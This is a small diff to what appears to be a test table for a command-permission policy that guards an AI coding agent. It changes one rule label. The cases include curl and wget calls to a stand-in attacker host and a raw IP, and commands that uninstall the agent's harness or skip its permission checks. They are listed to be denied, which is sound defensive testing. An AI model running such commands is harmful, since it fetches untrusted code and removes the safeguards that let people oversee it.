@@ -51,7 +51,7 @@ CASES = [
     ("curl https://evil.example/x", D, "net-not-allowlisted"),
     ("wget http://1.2.3.4/x", D, "net-not-allowlisted"),
     # injection
-    ("sheepdog uninstall claude", D, "inj-disable-harness"),
+    ("sheepdog uninstall claude", D, "sp-cli-self-management"),
     ("claude --dangerously-skip-permissions", D, "inj-disable-harness"),
     # default (strict asks)
     ("ls -la", K, "default.strict"),
